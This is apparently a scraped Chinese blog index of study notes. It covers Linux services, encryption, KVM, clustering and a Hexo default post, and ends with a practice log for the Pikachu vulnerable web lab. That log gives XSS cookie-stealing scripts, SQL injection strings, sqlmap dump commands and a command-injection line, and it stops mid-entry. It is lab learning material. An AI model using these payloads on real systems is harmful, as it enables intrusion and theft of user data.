&#x2F;etc&#x2F;init.d&#x2F;nfslock\n端口:2049(nfsd)\n配置文件: &#x2F;etc&#x2F;exports\n相关软件包: tcp_ wrappers\n\n用于防火墙的端口选项\n\nmountd, statd和lockd可以被强制使用一个静态端口\n\n\n\n在&#x2F;etc&#x2F;sysconfig&#x2F;nfs中设置MOUNTD_ PORT、STATD_ PORT LOCKD_ TCPPORTHE和LOCKD_ UDPPORT变量\nMOUNTD_ PORT&#x3D;”4002”\nSTATD_ PORT&#x3D; “4003”\nLOCKD_ TCPPORT&#x3D; “4004”\nLOCKD_ UDPPORT&#x3D; “4004”\n\n\n\nWEB 服务Aparch\n服务侧写: httpd\n\n类型:系统V(SystemV)管理服务\n\n\n\n软件包: httpd , httpd-devel , httpd-manual\n守护进程: &#x2F;usr&#x2F;sbin&#x2F;httpd\n脚本: &#x2F;etc&#x2F;init.d&#x2F;httpd\n端口: 80(http)、443 ( https )\n配置: &#x2F;etc&#x2F;httpd&#x2F;* , &#x2F;var&#x2F;www&#x2F;*\n相关软件包: mod_ _ssl\n\n邮件服务\n\nMTA - Mail Transfer Agent\n\n\n\nMDA - Mail Delivery Agent\nMUA一Mail User Agent\nMRA一Mail Retiveral Agent\n\n\n\n\n安装:\nSendmail\nPostfix\n\n\n\n\n\n基本配置\n监听的接口\n测试\n\nSMTP命令\n\nHELO连接者的主机名\n\n\n\nEHLO连接者的主机名( 使用ESMTP )\nMAIL FROM:\nRCPT TO:\nSIZE&#x3D;bytes (指定发送邮件的大小)\nDATA\nQUIT\nVRFY username\n\nSMTP限制\n\n在&#x2F;etc&#x2F;mail&#x2F;sendmail.mc中启用,使用\nFEATURE(blacklist recipients&#x27;)dnl\n\n\n\n在&#x2F;etc&#x2F;mail&#x2F;access中添加限制\nFrom:90trialspammer@aol.com     REJECTConnect:spamRus.net             REJECTConnect:204.168.23              REJECTConnect:10.3                    OKFrom:virtualdomain1.com         RELAYTo:user@dom9.com                ERROR:550 mail discardedTo:nobody@                      ERROR:550 bad name\n\n服务侧写: dovecot\n\n类型:系统V管理的服务\n\n\n\n软件包: dovecot\n守护进程: &#x2F;usr&#x2F;sbin&#x2F;dovecot口\n脚本: &#x2F;etc&#x2F;init.d&#x2F;dovecot 0\n端口: 110 (pop), 995 (pop3s), 143 (imap), 993 (imaps)\n配置: &#x2F;etc&#x2F;dovecot&#x2F;dovecot.conf, &#x2F;etc&#x2F;dovecot&#x2F;conf.d&#x2F;\n相关软件包: procmail, fetchmail, openssl\n\n防火墙防火墙功能\n\n内容过滤(元数据的过滤,内容过滤)\n\n\n\nNAT\n状态检测\nQos\n一体化:\nVPN\nIPS(入侵检测)\nAV (防毒墙)\n\n\n\nIptable\nNetfilter\n在内核中过滤:无守护进程在OSr参考模型(OSIReferenceModel)的第2、3、4层插入策略只查看数据包标题由内核中的netfilter 模块和iptables用户空间软件mangle: 用于对数据包相关字段的修改,如设置TOS、TTLnat: 只用于NAT转换时的访问控制filter: 默认表,用于一般的过滤\n\n\nNetfilter\niptable -t filter -A INPUT -s 192.168.0.1 -j DROP# -t: 指定表# -A: 添加策略# -s: 指定源地址# -j: 跳转\n\n规则目标\n\n内置自标: DROP, ACCEPT\n\n\n\n扩展目标: LOG, REJECT,定制链( custom chain )\nREJECT给发送者返回-个通知\nLOG连接系统日志内核工具\nLOG匹配不会从链中退出\n目标是可选的,但是每条规则最多只能有一个目标,如没有目标,就默认使用链的策略\n\n匹配规则\n\n按顺序配列的规则\n\n\n\n按规则顺序测试数据包\n首次匹配后会评估目标:通常退出链\n规则可以指定多个匹配条件\n必须满足规则说明中的每个条件才算是匹配(逻辑AND )\n如果无匹配规则应用链策略\n\nSNAT\n\nMASQUERADE\niptables -t nat -A POSTROUTING -0 eth0 -j MASQUERADE\n\n\n\n\n\nSNAT\niptables -t nat -A POSTROUTING j SNAT –to-source 1.2.3.45\n\n\n\n&#x2F;etc&#x2F;passwd\n\n\n字段\n含义\n说明\n\n\n\n1\n用户名\n是uid的字符串标记方式\n\n\n2\n密码\n在旧的unix系统中，该字段是用户加密后的密码，现在已经不再使用，而是将密码放在&#x2F;etc&#x2F;shadow中，所以此处都只是一个字母X\n\n\n3\nUID\n系统用来区分不同用户的整数\n\n\n4\nGID\n系统用来区分不同用户组的整数\n\n\n5\n说明栏\n类似于“注释”\n\n\n6\n家目录\n用户登录后，默认所处的目录，即家目录\n\n\n7\n登录SHELL\n用户登录后，所使用的SHELL\n\n\n&#x2F;etc&#x2F;shadow\n\n\n字段\n含义\n说明\n\n\n\n1\n用户名\n是VID的字符串标记方式\n\n\n2\n密码\n经过如密后的密码\n\n\n3\n密码的最近修改日\n这个数字是从1970年1月1号至密码修改日的天数\n\n\n4\n密码不可修改的天数\n修改密码后，几天后不可修改密码，如果是0，意味着随时可以修改\n\n\n5\n密码重新修改的天数\n密码什么时候过期\n\n\n6\n密码失效前提前警告的天数\n设定密码过期前提前几天开始提醒\n\n\n7\n密码失效宽限天数\n密码过期后多少天，密码将失效\n\n\n8\n账号失效日期\n这个数字是从1970年1月1号至账号失效日的天数\n\n\n9\n保留字段\n预留\n\n\n集中认证\n\n集中认证产品\nLDAP - AD , IPA, Oracle&#x2F;IBM Directory Server\nNIS\nSAMBA\nLDAP + kerberos\nradius\n…\n\n\n\n\nLDAPLightweight Directory Access Protocol (轻量型目录访问协议)\n\n\n目录是一-个特殊的数据摩,通常存储一-些小的信息\n\n\n\n例子:\n电话簿是- -个存储名字和电话的目录\nDNS是一个存储主机名与IP的目录\nNIS是- -个存储了系统信息,用户名和密码,还有email地址等的目录\n\n\n使用目录服务\n查寻email地址和联系人信息\n管理和同步用户信息\n可以被其它网络服务使用\n存储和查找其它相关的信息\n\n\nLDIF\n一个标准的基于文本格式的文件,描述目录条目\n一个条目由一-列属性组成，每一行一个属性\ndn,是一个条目独一的名字，必须位于第一行\n条目与条目之间用空行来分隔\n\n\n\nSample Entry in LDIF Form\n\ndn: uid&#x3D;bjensen, ou&#x3D;people, dc&#x3D;example, dc&#x3D;com\n\n\n\nobjectclass: top\nobjectclass: person\nobjectclass: organi zationalPerson\nobjectclass: inetOrgPerson\ncn:Barbara Jensen\ncn: Barb Jensen\nsn: Jensen\nuid: bjensen\nmail: bj ensen@example . com\ntelephoneNumber: +1 919 754 3700\npostalAddress: Example， Inc.$123 Main\nStreet$Any Town, NC 12345$USA\ntitle: Account Manager\n\n目录Schema\n\nattribute types :规定属性的值的格式化,以及怎么比较相同类型的两个属性\n\n\n\nobject classes :代表的一类相似的对象,规定哪些属性是必须的,哪些是可选的\n\nObjects Classes\n\n一个object class组织相关的信息\n定义了哪些属性是强制的,必须的\nobjectclass属性定义了一个条目属于哪些object classes\n\n\n\n\n\n有两种类型的object classes\n一个条目必须有一个structural object class\n一个条目可以有一 个或多个auxiliary object classes\n\n\n\nKerberos安全网络认证系统\n\n有三个参与者:\nKey Distribution Centor ( KDC )\n网络服务\n客户端用户\n\n\n\n\n初始化认证\n\n用户输入用户名和密码\n\n\n\n登录程序向KDC请求TGT\nKDC发送给登录程序-一个用用户的密码加密的TGT\n如果登录程序能用用户输入的密码解密TGT ,用户就被成功认证\n\n票据认证\n\n客户端向KDC发送访问服务所需要的票据的请求\n\n\n\nKDC发送给客户端两个相同的副本\n一个是用TGT加密的副本\n一个是用服务的密码加密的副本\n\n\n客户端发送给网络服务\n一个是用服务的密码加密的副本\n一个是用票据加密的时间戳\n\n\n\n标识参与者\n\n标识用户和网络服务\n使用primary , instance和realm\n\n\n\n\n\n格式: primary&#x2F;instance@realm\n例子:\nstudent@ABC. COM\nuser1&#x2F;admin@ ABC.COM\nhost&#x2F;server1.abc.com@ ABC.COM\nnfs&#x2F;host.abc.com@ABC.COM \n\n\n\n目录服务 IPA\n\nIPA:是一个集成解决方案\nIdentity , Policy yand Audit\n\n\n\n\n\nIPA使用以下组件:\nRed HatIDirectory Server\nMIT kerberos\nNTP\nBIND\nWeb Management Tools\nIPA command-line Tools\n\n\n\n数据安全随机数发生器熵\n\n熵-用于描述系统混乱无序程序的物理量\n熵越大,不确定性越大\n\n\n\n\n\n内核维护了一个熵池用来收集来自设备驱动程序和其它来源的环境噪音\n内核提供来源:\n&#x2F;dev&#x2F;random - 会阻塞,耗时长,但安全\n&#x2F;dev&#x2F;urandom - 不会阻塞,需要借助键盘或鼠标等事件,随机程度不高,适合生成较低强度的密码\n\n\n\n单向散列单项散列函数,又叫hash函数, 是一种将任意长度的数据缩小成固定长度指纹的一种方法\n特性 - 确定性如果两个散列值是不相同的(根据同- -函数) ,那么这两个散列值所对应的原始输入也是不同的\n常见算法MD2，MD5，MDC2,RMD160,SHA,SHA1\n常见工具\n\nshalsum [ –check ] file\n\n\n\nmd5sum [ –check ] file\nopenssl\ngpg\nrpm -V\n\n应用场合\n数据完整性检查\n按照关键字查找数据记录\n\n单项散列是不能取代对称加密和不对称加密,它们是互补的\n对称加密\n加密数据和解密数据, 基于同一个KEY\n优点: 相比不对称加密,效率高缺点: 相比不对称加密,安全性差\n常用算法:DES, 3DES , Blowfish, RC2 , RC4, RC6 ,IDEA, CAST5\n常见工具\npasswd\ngpg ( 3DES , CAST5 , Blowfish)\nopenssl\n\n应用信息量的数据, 一般用对称加密对称加密和非对称加密常会结合使用\n不对称加密\n又叫公开密钥加密,是指一对加密密钥与解密密钥,用密码对当中的一个加密，必须是另一个密钥才能解密。公开的密钥为公钥,不公开的密钥叫私钥。\n如果加密密钥公开,这用于客户给私钥所有者.上传加密的数据,这被称作公开密钥加密。\n如果解密密钥公开,用私钥加密的信息,可以用公钥对其解密，由于客户验证持有私钥- -方发布的数据或文件是可靠的,接收者由此可知这条信息确实来自于拥有私钥的某人,这被称做数字签名。\n\n常见算法\n\nRSA\n\n\n\nDSA\nEIGamal\nECC\nDeffie-Hallman中的公钥加密算法\n\nGnuPGPGP - Pretty Good Privacy\n\n是PGP公司开发的加密签名工具套件\nopenGPG是最广泛使用的email加密工具，最初是基于PGP开发的\n\n对称加密\ngpg -C filename\ngpg -0 filename1 -d filename.gpg\n\n不对称加密\ngpg –gen-key\ngpg –list-keys\ngpg –export –armor &lt;key’s name&gt; filename\ngpg –import filename\ngpg -e –armor-r &lt;key’s name&gt; filename\n\n数字签名和加密\ngpg -sea -r &lt;key’s name&gt; filename\ngpg -d filename.asc\n\nPKIPKI - Public Key Infrastructure(公钥基础设施),是一套创建、存储、分发用于验证公钥的数字证书系统\nPKI组件\nCA- Certificate Authority\nRA - Registration Authority\n最终用户\n\n数字证书\n用于认证\n将公司、个人和公钥绑定\n由CA颁发或自行签发证书\n\n\nX.509X.509是PKI中针对证书格式、证书吊销列表和授权证书等所制定的标准\n\n\n所包含的内容:\n版本\n序列号\n算法ID\n发行者\n有效期\n主题\n证书签名\n证书签名算法\n\n\n\n\nSSLSSL- Secure Sockets Layer是一种安全协议,是Netscape公司在推出WEB浏览器首款时提出的,为网络通信提供数据安全及数据完整性。\n工作在OSI的第六层.\n\n优势:它是与第七层的应用层协议独立的,高层的应用层协议能透明的建立于SSL协议之上\n\nTLS和SSL\nIETF将SSL做了标准化,即RFC2246,并将其称为TLS\nTLS - Transport Layer Security\n从技术上, TLS和SSL相差不大\n\n\nTLS和SSL握手协议\nSSL应用\nSSH\nHTTPS\nIMAPS\nPOP3S\n\nOpensslOpenssI是一个开源的SSL&#x2F;TLS协议的实现工具,能用于生成keys或者加密解密数据,也能创造和管理X. 509数字证书。\n\n\n加密\nopenssI enc-des3 -salt - -a -in plaintext - -out ciphertext.des3\n\n\n\n\n\n解密\nopenssI enc-d -des3 - salt -a -in ciphertext.des3 - out plaintext\n\n\n\n单项散列\n\n\n命令\nopenssl agst- -sha1 &#x2F;boot&#x2F;grub&#x2F;grub.conf\nopenssl passwd -1\n\n\n\n\n生成RSA公钥和私钥\n\n\n生成不加密的私钥\nOpenssl genrsa &gt; somename.key\n\n\n\n\n\n生成加密的私钥\nOpenssI genrsa -aes128 2048 &gt; somename.key\n\n\n生成公钥\nOpenssI rsa -in somename.key -pubout - -out public.key\n\n\n\n不对称加解密\n\n\n加密\nopenssl rsautl -encrypt -pubin -inkey public.key -in plaintext -out encrypted.txt\n\n\n\n\n\n解密\nopenssI rsautl -decrypt -inkey private.key - -in encrypted.txt -out plaintext.txt\n\n\n\n生成CSR文件\n\n\n命令\nopenssI req -new -key somfile.key -out somefile.csr\n\n\n\n\n撤销证书\n\n命令\nopenssI ca -revoke stolen.crt\n\n\n\n\n","categories":["笔记"],"tags":["笔记","云计算"]},{"title":"云计算 - Linux开源虚拟化KVM","url":"/2023/04/19/cloud_linux_4/","content":"虚拟化概述虚拟化的定义\n\n在计算技术中, 虚拟化意味着创建设备或资源的虚拟版本,如服务器、存储设备、网络或者操作系统等等..\n\n\n\n虚拟化技术\n系统虚拟化\n这种虚拟化通常表现为在单一系统上运行多个操作系统\n这些虚拟操作系统同时运行,每个操作系统又是相互独立\n\n\n存储虚拟化\n网络虚拟化\nGPU虚拟化\n软件虚拟化\n硬件支持虚拟化\n\n\n纯软件仿真\n通过模拟完整的硬件环境来虚拟化来宾平台。\n模拟X86、ARM、PowerPC等多种CPU\n效率比较低\n产品或方案\nQEMU、Bochs、 PearPC\n\n\n\n\n\n虚拟化层翻译\n\n多数的虚拟化而采用虚拟机管理程序Hypervisor\n\n\n\nHypervisor是一个软件层或子系统\n也称为VMM ( Virtual Machine Monitor ,虚拟机监控器)\n\n\n允许多种操作系统在相同的物理系统中运行\n控制硬件并向来宾操作系统提供访问底层硬件的途径\n向来宾操作系统提供虚拟化的硬件\n\n\n无硬件辅助的全虚拟化\n\nFull Virtualization without Hardware Assist\n\n\n\n基于二进制翻译的全虚拟化\nFull Virtualization with Binary Translation\nHypervisor运行在Ring 0\nGuest OS运行在Ring 1\n机制:异常、捕获、翻译\n示例:\nVMware Workstation\nQEMU\nVirtualPC\n\n\n\n半虚拟化Para virtualization\n\n也称为:超虚拟化、操作系统辅助虚拟化\n\n\n\nHypervisor运行Ring 0\nGuest OS不能直接运行在Ring 0 , 需要对Kernel进行修改,将运行在Ring 0上的,指令转为调用Hypervisor\nGuest OS.上的APP运行在Ring 3\n示例:Xen\n\n硬件辅助的全虚拟化\n\nFull Virtualization with Hardware Assist\n\n\n\nIntel VT和AMD-V创建一个 新的Ring -1单独给Hypervisor使用\nGuest OS可以直接使用Ring 0而无需修改\n示例:\nVMware ESXi\nMicrosoft Hyper-V\nXen3.0\nKVM\n\n\n\nLXC和Docker\n\n一种轻量级&#x2F;操作系统虚拟化方式，由Linux内核支持\n\n\n\n起源: chroot系统调用,对当前程序及其子进程改变根目录\n优势:\n更快速的交付和部署\n更高效的虚拟化\n更轻松的迁移和扩展\n更简单的管理\n\n\n\n\n\n\n特性\n容器\n虚拟机\n\n\n\n启动\n秒级\n分钟级\n\n\n硬盘使用\n般为MB\n般为GB\n\n\n性能\n接近原生\n弱于\n\n\n系统支持量\n单机支持上千个容器\n一般几十个\n\n\nKVM安装\n\nCPU必须支持虚拟化技术,在BIOS设置为启动\n\n\n\n目前,多数服务器基础桌面计算机均处理启用状态.\n\n\n\n“嵌套”式实验环境\n在虚拟机中再做虚拟化\n\n\n\n\n\nVMware嵌套虚拟化\n产品: Workstation、 Player、 ESXi\n支持: ESXi、 Hyper-V、 KVM、Xen\n\n\nKVM嵌套虚拟化\n支持: ESXi、Hyper-V、 KVM、Xen\n\n\n\n\n实验环境准备\n\n“嵌套” 式实验环境\nVMware Workstation Player或VMware Workstation\n创建虚拟机,在此虚拟机上安装KVM\n\n\n\n\n&#x2F;&#x2F; TODO: 待补充\nKVM的远程管理\n\nssh\n\n\n\nVNC\nX-Windows\n\nKVM三种网络模式\nBridged（桥接模式）、NAT（网络地址转换模式）、Host-Only（仅主机模式）。\n\nBridged（桥接模式）什么是桥接模式？桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。\nNAT（地址转换模式）刚刚我们说到，如果你的网络ip资源紧缺，但是你又希望你的虚拟机能够联网，这时候NAT模式是最好的选择。NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。在NAT模式中，主机网卡直接与虚拟NAT设备相连，然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上，这样就实现了虚拟机联网。\nHost-Only（仅主机模式）Host-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯\n\n\n桥接模式：自动生成的IP地址会随着主机的IP随时变化。\n\n\n\nNAT模式：下虚拟机的IP地址一旦生成，就不会改变了。\n\n","categories":["笔记"],"tags":["笔记","云计算"]},{"title":"云计算 - Linux集群","url":"/2023/05/18/cloud_linux_5/","content":"概述\n\n群集基础\n\n\n\nLinux群集概述\npacemaker+ corosync+ pcS\n演示:无共享存储的Web群集构建\n演示:基于NFS共享存储的Web群集构建\n\n\n使用Linux-IO构建iSCSI存储\n演示:基于SAN共享存储的MySQL群集构建\n\n\nDRBD\n演示:基于DRBD的MySQL群集构建\n\n\nGFS2\n演示:基于DRBD+ GFS2的Active&#x2F;Active的Web群集构建\n\n\n\nLinux群集概述什么是群集?\n集群是将-组计算机和存储设备组成在一起,作为一个整体系统来提供用户访问集群中计算机共同来提供:* 分担进程的负载* 自动恢复集群中的一个或多个组件的失败\n\n群集术语\n\n\n术语\n描述\n\n\n\n节点\n参与群集的服务器\n\n\n资源\n托管在集群中设备或服务,被应用程序或最终用户直接或间接地访问\n\n\n故障转移群集\n一种高可用性集群类型。 在一一个时刻 ,资源只能单个服务器所拥有\n\n\n负载平衡\n负荷由由多个节点分担处理的集群类型\n\n\n容错\n集群的一个关键组件,能够在硬件或软件出现问题时还能继续运作\n\n\n计划停机时间\n由于更新或其他维护操作,应用程序不可用的时间\n\n\n非计划停机时间\n由于组件失败,关键应用程序不可用的时间\n\n\n群集类型\n\n\n群集类型\n描述\n\n\n\n高可用(HA)群集\n如果正在运行服务器遭遇失败,由其他的节点提供备份\n\n\n负载平衡群集\n将传入的网络请求分布到各个节点进行处理\n\n\n高性能计算(HPC)群集\n计算任务分布在多个节点\n\n\n网格计算群集\n独立的节点完成的被分派来任务或集群中其余部分分解的来工作\n\n\n群集实现\n\n\n群集分类\n描述\n\n\n\n共享设备群集\n在节点之间共享数据和其他资源 如果两个系统必须访问相同的数据,这些数据必须从磁盘读两次或从一个系统复制到另外一系统\n\n\n无共享群集\n无共享群集在每个节点有单独的资源 一个时刻仅有一个节点访问特定的资源 失败时,其他节点会取得对象的所有权\n\n\n群集优势\n\n可用性(Availability)\n集群增加的处于可操作状态的时间百分比可伸缩性(Scalability)\n群集通过根据需要逐步增加资源,来满足所有处理能力或可用性要求可管理性(Manageability)\n集群使配置、更新和添加等管理更加容易\n\n\n\n\n什么是可用性?\n通过以下方式提高系统的可用性百分比:* 增加平均失效到达时间(MTTF mean time to failure)* 减少平均恢复时间(MTTR mean time to recover)\n\n\n\n\n可用性等级\n每年宕机时间\n\n\n\n2个9(99%)\n3.7天\n\n\n3个9(99.9%)\n8.8小时\n\n\n4个9(99.99%)\n53分钟\n\n\n5个9(99.999%)\n5.3分钟\n\n\n\n\n什么是可扩展性?\n提高可扩展性的方式有:\n\n\nScaling up\n向一个节点添加更多的资源,如内存、CPU和磁盘\n\n\nScaling out\n添加更多的节点以分担负荷\n\n\nConsolidation\n通过将多个服务器负载迁移到一个服务器或少量的高配置的计算机,让少量的服务器承担更多的负荷。\n\n\n\n什么是集群的可管理性?\n\n群集通过以下方式来提高和可管理性:\n\n\n\n灾难恢复\n集群帮助应用程序的从灾难中进行恢复\n\n\n更新管理\n集群使应用程序、操作系统在升级更新时,仍然可用\n\n\n\n微软SQL Server故障转移群集工作原理\n网络负载平衡( NLB)群集\n\n为网络服务提供可扩展性\n增强接收TCP和UDP流量的网络相关应用程序的可用性\n包含所有活动节点\n运行需要实现负荷平衡的基于IP的应用程序或服务副本,在每个节点保存所需的数据\n\n\n什么是群集化的服务和资源?\n\n群集化的服务\n安装在故障转移群集以实现高可用的服务或应用程序\n在一个活动节点上,也可被移动到其它节点\n\n\n资源\n组成群集化服务的组件\n在一个时间,只能运行在一个节点之 上\n当一个节点失效时,可以被移动到别个一个节点\n包含的组件有共享磁盘,主机名和IP地址等\n\n\n\n\n故障转移群集和网络\n\n故障转移群集使用以下网络:\n公共网络:用于客户与群集服务之间的通信\n私有网络:用于节点之间的通信\n存储网络:与外部存储系统通信\n\n\n\n\n\n一个网络可同时支持客户与节点间通信\n推荐使用多网以提供增强的性能和冗余\n\n什么是仲裁(Quorum)?\n在故障转移集群,仲裁定义足够的可用集群成员提供服务\n\n仲裁(Quorum):\n基于投票(vote)的\n根据不同仲裁模式，可使用节点,文件共享或共享磁盘用来投票\n当有足够的票数时,允许故障转移群集保持在线\n\n\n\n\n\n合法:\ntotal nodes &lt; 2 * active_ nodes\n\n\n\n微软群集仲裁模式类型\n\n\n仲裁模式\n描述\n\n\n\n节点多数模式\n仅有群集中的节点有vote 当超过半数的节点在线时,才满足Quorum要求\n\n\n节点和磁盘多数模式\n群集中的节点和见证(witness)磁盘有vote 当超过半数的vote在线时,才满足Quorum要求\n\n\n节点和文件共享多数模式\n群集中的节点和见证(witness)文件共享有vote 当超过半数的vote在线时,才满足Quorum要求\n\n\n非多数:仅磁盘模式\n仅quorum共享磁盘有vote 当共享磁盘在线时,才满足Quorum要求\n\n\n","categories":["笔记"],"tags":["笔记","云计算"]},{"title":"Hello World","url":"/2022/01/01/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","categories":["hello world"],"tags":["hello world"]},{"title":"Pikachu练习记录","url":"/2023/08/10/pikachu_practice/","content":"Pikachu练习记录0x01 Pikachu靶场Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。\n靶场链接：Pikachu\n0x02 暴力破解基于表单的暴力破解如题，直接放burp里暴力破解即可\n验证码绕过（on server）在intruder里同一个验证码可重复使用\n验证码绕过（on client）在intruder里同一个验证码可重复使用，也可以审查元素把相关的验证码代码删掉，不影响\nToken防爆破？多次抓包后发现，每次抓取的数据包中都含有下次请求所需要的token\n\n可以用burp里Intruder进行爆破，爆破类型用Pitchfork，爆破变量为password和token\n\n\n对于token载荷相关设置，Payload type选择为 Recursive grep（递归搜索）\n然后在设置中的Grep - Extract中添加过滤项，找到token的位置，进行添加，同时把token值复制一下\n\n最后填写下一个token值开始爆破\n\n\n0x03 Cross-Site Scripting反射型xss（get）输入框被限制了最大输入长度，但是可以通过审查元素修改maxlength值来解除限制\n\n输入框直接上脚本&lt;script&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;\n\n反射型xss（post）登陆进去后输入框内输入以下内容&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n\n存储型xss&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n\nDOM型xss输入hello正常文本\n\n输入下方文本\n#&#x27; onclick=alert(&#x27;hello&#x27;)&gt;\n\n\nDOM型xss-x&#x27; onclick=alert(&#x27;hello&#x27;)&gt;\n\n输入信息同时也会显示在url输入框里。\n\nxss之盲打留言板输入：&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n\n\n提示&#x2F;xssblind&#x2F;admin_login.php，登陆后台发现脚本会立即执行\nxss之过滤大小写绕过\n&lt;ScRipt&gt;alert(1)&lt;/ScriPt&gt;\n\nxss之htmlspecialchars&#x27; onclick=&#x27;alert(1)&#x27;&#x27; onclick=&#x27;javascript:alert(document.cookie)&#x27;\n\nxss之href输出js伪协议绕过\njavascript:alert(1)\n\nxss之js输出输入信息通过审查元素可以看到输入内容在js标签内\n\n可以先把前面的&lt;script&gt;进行闭合，构造以下payload即可\n&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\n\n0x04 CSRFCSRF(get)CSRF(post)CSRF(token)0x05 Sql Inject数字型注入1，手动注入\n发现是个选项，无法输入东西 ，直接拦截数据包，在burp里进行修改\n\nid=1#正常回显id=1&#x27;#提示报错id=1 and 1=1#正常回显id=1 and 1=2#报错，基本判断为mysql数据库的数字型注入点id=1 or 1=1#直接爆破出全部数据\n\n2，无脑sqlmap\nsqlmap.py -u http://127.0.0.1/vul/sqli/sqli_id.php --data &quot;id=1&quot; --batch -D pikachu -T member --dump\n\n\n字符型注入123#正常123&#x27;#发现报错123&#x27;&#x27;#又是正常了，基本上判定为字符型注入123&#x27; or 1=1 ##爆出所有用户//附123&#x27; union select database(),2 ##查询数据库名称123&#x27; union select table_schema,table_name from information_schema.tables where table_schema=&quot;pikachu&quot; ##查询表，发现有个users项123&#x27; union select table_name,column_name from information_schema.columns where table_name=&quot;users&quot; ##查询uesrs表中的内容，发现存在username和password项123&#x27; union select username,password from users ##查出信息，但是密码是经过md5加密的，解密一下就行\n\nsqlmap\nsqlmap.py -u &quot;http://127.0.0.1/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -D pikachu -T member --batch --dump\n\n搜索型注入由于没有过滤“%”，“%”可以进行匹配任意字符，与linux中的”*“类似\nsqlmap\nsqlmap.py -u &quot;http://127.0.0.1/vul/sqli/sqli_search.php?name=1&amp;submit=%E6%90%9C%E7%B4%A2&quot; --batch -D pikachu -T member --dump\n\nxx型注入用123‘测试发现报错中含有一个反括号，\n\n那就构造以下payload：\n123&#x27;) or 1=1 #\n\nsqlmap\npython sqlmap.py -u &quot;http://127.0.0.1/vul/sqli/sqli_x.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch -D pikachu -T member --dump\n\n“insert&#x2F;update”注入注册一下账户，然后brup抓包，随便选一个变量，修改如下\n\n&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select database()))) and &#x27;1&#x27;=&#x27;1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1# 报错注入两个典型的函数extractvalue()\t\t是mysql对xml文档数据进行查询和修改的xpath函数updatexml()\t\t\t是mysql对xml文档数据进行查询的xpath函数\n\n“delete”注入操作同上，在点击删除留言时进行抓包，发现有一个id参数可以进行注入，不过发现注入的参数中不能出现空格，否则空格后面不会进行处理\n可以用“+”代替空格\n+and+updatexml(1,concat(0x7e,database(),0x7e),1)\n\n\n“http header”注入\n用提示给的用户登陆以下发现显示以上信息\n直接抓包，然后修改User-Agent或者Accept，\n修改如下：\n&#x27; and extractvalue(1,concat(0x7e,(database()))) and &#x27;1&#x27;=&#x27;1或&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1\n\n经测试，cookie中的uname和pw变量也能进行注入\n盲注（base on boolean）当输入kobe时显示uid和email\n当输入其他的值后显示输入的username不存在\n\n经测试是用 ‘ 进行闭合的\nkobe&#x27;# 未查到username信息kobe&#x27;and &#x27;1&#x27;=&#x27;1#可以查到，判定用&#x27;闭合kobe&#x27;and length(database())=n## &quot;n&quot;为一个数字，此处为了判定数据库字符的长度，经测试，当n=7时，正常显示，即可判定数据库名字长度为7\n\nburp抓包进行爆破数据库名字\nkobe&#x27; and substr(database(),1,1)=&#x27;a&#x27;#\n\n\n第一个参数修改\n\n第二个参数修改，爆破字符为a-z ，顺带着添加一个”_”\n\nsqlmap\nsqlmap.py -u &quot;http://127.0.0.1/vul/sqli/sqli_blind_b.php?name=123&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch\n\n然后稍微排下序即可爆出数据库名字\n\n盲注（base on time）增加一个sleep(n)函数，加个判断，用回显时间的长短来判断，剩下的操作和上一样\nsqlmap\nsqlmap.py -u &quot;http://127.0.0.1/vul/sqli/sqli_blind_t.php?name=123&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch\n\n宽字节注入引用大佬的链接https://blog.csdn.net/aa2528877987/article/details/118569895 \n宽字节注入原理：　　GBK 占用两字节　　ASCII占用一字节　　PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。　　输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。　　%DF’ ：会被PHP当中的addslashes函数转义为“%DF\\&#x27;” ，“\\”既URL里的“%5C”，那么也就是说，“%DF&#x27;”会被转成“%DF%5C%27”倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。也就是“縗’”例如：http://www.xxx.com/login.php?user=%df’ or 1=1 limit 1,1%23&amp;pass=其对应的sql就是：select * fromcms_user where username = ‘運’ or 1=1 limit 1,1#’ and password=”\n\n在’前面加个%df也就可以实现逃逸转义，然后burp抓包，剩下操作同上\n0x06 RCEexec”ping”127.0.0.1&amp;&amp;dir#执行完ping指令后同时执行dir指令\n\nexec”eval”直接输入 